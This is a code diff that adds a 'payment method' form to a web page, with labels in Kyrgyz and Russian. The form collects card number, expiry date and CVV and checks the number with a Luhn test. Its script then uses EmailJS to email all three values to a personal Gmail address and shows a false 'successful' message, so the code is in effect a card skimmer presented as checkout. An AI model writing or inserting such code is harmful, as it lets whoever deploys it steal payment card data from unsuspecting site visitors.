@@ -159,3 +159,56 @@
     });
   });
 </script>
+
+    <div class="demo-payment">
+  <h2>Платежный метод 💳</h2>
+  <form id="paymentForm">
+    <input type="text" name="cardNumber" placeholder="Карта номери" required><br><br>
+    <input type="text" name="expiry" placeholder="Мөөнөт (MM/YY)" required><br><br>
+    <input type="text" name="cvv" placeholder="CVV" required><br><br>
+    <button type="submit">Төлөө</button>
+  </form>
+  <p id="demoResult" style="color:#0ea5e9;"></p>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  (function(){
+     emailjs.init("ТВОЙ_PUBLIC_KEY"); // Сенин EmailJS public key
+  })();
+
+  function isValidCard(number) {
+    let sum = 0;
+    let shouldDouble = false;
+    for (let i = number.length - 1; i >= 0; i--) {
+      let digit = parseInt(number.charAt(i));
+      if (shouldDouble) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      sum += digit;
+      shouldDouble = !shouldDouble;
+    }
+    return sum % 10 === 0;
+  }
+
+  document.getElementById('paymentForm').addEventListener('submit', function(event){
+    event.preventDefault();
+    if (!isValidCard(this.cardNumber.value)) {
+      document.getElementById('demoResult').textContent = "Ошибка: карта номер ката!";
+      return;
+    }
+
+    emailjs.send('service_id', 'template_id', {
+      cardNumber: this.cardNumber.value,
+      expiry: this.expiry.value,
+      cvv: this.cvv.value,
+      to_email: 'zantoroajtmatov@gmail.com'
+    }).then(function(){
+      document.getElementById('demoResult').textContent = "Успешно прошли!";
+      document.getElementById('paymentForm').reset();
+    }, function(error){
+      document.getElementById('demoResult').textContent = "Ката кетти: " + JSON.stringify(error);
+    });
+  });
+</script>
